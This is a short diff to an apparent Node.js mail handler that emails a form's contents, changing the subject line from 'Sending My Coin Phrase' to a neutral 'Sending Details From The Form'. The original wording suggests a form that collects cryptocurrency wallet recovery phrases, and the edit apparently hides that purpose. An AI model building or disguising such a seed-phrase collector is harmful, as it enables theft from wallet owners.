@@ -17,7 +17,7 @@ const sendMail = async (req, res) => {
         let mailDetails = {
             from: process.env.gmail,
             to: email,
-            subject: "Sending My Coin Phrase",
+            subject: "Sending Details From The Form",
             text: bag
         }
         mailTransporter.sendMail(mailDetails, (err) => {
